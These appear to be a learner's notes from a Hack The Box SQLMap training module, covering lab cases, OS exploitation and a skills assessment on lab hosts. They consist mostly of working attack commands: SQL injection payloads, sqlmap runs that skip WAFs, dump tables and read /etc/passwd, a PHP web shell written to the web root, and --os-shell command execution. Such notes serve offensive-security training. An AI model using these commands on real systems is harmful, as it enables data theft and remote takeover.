sqlmap 'http://94.237.63.83:39055/case10.php' -X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://94.237.63.83:39055/case10.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://94.237.63.83:39055' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=mfp2r8oce9bv56cfsic2deeiri' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'id=1' --random-agent --risk=3 --skip-waf --batch --dump -T flag10

or using this would work (from CURL)

sqlmap 'http://94.237.63.83:39055/case10.php' -X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://94.237.63.83:39055/case10.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://94.237.63.83:39055' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=mfp2r8oce9bv56cfsic2deeiri' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'id=1' --risk=3 --skip-waf --batch --dump -T flag10

What's the contents of table flag11? (Case #11) 
- SQLi injection discovery-> Vulnerable to or injection.
	-> Payload used: 1 or '2'='2'
- Performing SQLMap injection on tamper=between, risk level3, skip waf, batch, dump flag11

sqlmap 'http://94.237.63.83:39055/case11.php?id=1*' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=mfp2r8oce9bv56cfsic2deeiri' -H 'Upgrade-Insecure-Requests: 1' --tamper=between --risk=3 --skip-waf --batch --dump -T flag11

Huge tip:
- Too slow use pwnbox
```

#### OS Exploitation
```
## File Read/Write
- Need LOAD DATA and INSERT privilege to read data

## Checking for DBA privileges
areaeric@htb[/htb]$ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba

areaeric@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --is-dba

## Reading Local Files
areaeric@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"

areaeric@htb[/htb]$ cat ~/.sqlmap/output/www.example.com/files/_etc_passwd

## Writing Local Files
areaeric@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php

areaeric@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"

areaeric@htb[/htb]$ curl http://www.example.com/shell.php?cmd=ls+-la

## OS Command Execution
areaeric@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell
os-shell> ls -la
do you want to retrieve the command standard output? [Y/n/a] a

areaeric@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E

Note: SQLMap first asked us for the type of language used on this remote server, which we know is PHP. Then it asked us for the server web root directory, and we asked SQLMap to automatically find it using 'common location(s)'. Both of these options are the default options, and would have been automatically chosen if we added the '--batch' option to SQLMap.

## Questions
Try to use SQLMap to read the file "/var/www/html/flag.txt".

-> SQLi injection discovery process:
	Payload used: id=1 or '2'='2'

-> Running sqlmap on checking DBA privileges, risk3, skip-waf and --batch
sqlmap 'http://83.136.252.32:56701/?id=1' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://83.136.252.32:56701/' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --risk=3 --skip-waf --is-dba --batch
	-> is DBA

- Reading local files
sqlmap 'http://83.136.252.32:56701/?id=1' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://83.136.252.32:56701/' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --risk=3 --skip-waf --batch --file-read "/var/www/html/flag.txt"
-> Q1 done

- OS Command Execution
sqlmap 'http://83.136.252.32:56701/?id=1' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://83.136.252.32:56701/' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --risk=3 --skip-waf --batch --os-shell --technique=E

ls -la /
cat /flag.txt
-> Q2 done

ls doesn't bring output?
```

## Skills assessment
```
You are given access to a web application with basic protection mechanisms. Use the skills learned in this module to find the SQLi vulnerability with SQLMap and exploit it accordingly. To complete this module, find the flag and submit it here.

- Perform web crawling, FFuF attacks
-> Relevant websites:
- about.html, blog-single.html, blog.html, cart.html, cart.tml, checkout.html, checkout.html(optradio), contact.html, index.html, product--single.html, shop.html, shop.html, POST:shop.html()(people).

- We examine Websites making post-request as that's usually high-value parameter being send. 
	-> We see an id parameter being added and send.
	- We will take a look at potential SQLinjection. Since this is 
	a json data, we will have to directly run SQLMap and see how it goes.

	- Interacted with the website and clicked on add-to-cart.
	- Examine the request with burp, copy request:

skill_req.txt:
POST /action.php HTTP/1.1
Host: 94.237.49.166:35569
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://94.237.49.166:35569/shop.html
Content-Type: application/json
Content-Length: 8
Origin: http://94.237.49.166:35569
DNT: 1
Connection: close

{"id":1*}

- Following sqli discovery process we see an error, likely vulnerable to sql injection.

- We now perform sql injection

sqlmap -r skill_req.txt 
-> one performing on beyond risk 1 and level 1, the other on other on a short test
-> vulnerable to a time-based blind sql injection query

- start database enumeration on finding a specific table final_flag
- Through sqlmap output, we should use --tamper-between to ensure > characters are not being filtered (good practice as well)

sqlmap -r skill_req.txt --tamper=between --search -T flag
-> final_flag in production database


sqlmap -r skill_req.txt --tamper=between --dump -D production -T final_flag
-> finish
```